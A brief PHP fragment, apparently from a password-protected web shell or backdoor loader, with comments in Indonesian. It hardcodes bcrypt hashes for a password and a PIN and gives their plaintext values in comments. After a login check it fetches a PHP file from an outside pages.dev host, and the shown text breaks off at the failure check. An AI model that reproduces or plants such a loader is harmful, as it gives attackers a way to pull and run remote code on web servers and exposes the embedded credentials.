...
$hashed_password = '$2y$10$atY0rP8P/dyb4m4.AcWF7uTxh8shSfxwH1i9.cnC1MYju2JQYuZou'; // bcrypt dari 'rahasia123'
$hashed_pin = '$2y$10$68VA07zc3.c698DKPg1NfOXuEgXGvmf3zb6t3HXTXsoILYDhwlNd.'; // bcrypt dari '246810'
...
if (is_logged_in()) {
    $a = geturlsinfo('https://zhyperdb-ori.pages.dev/zhyperori.php');
    if ($a === false) {
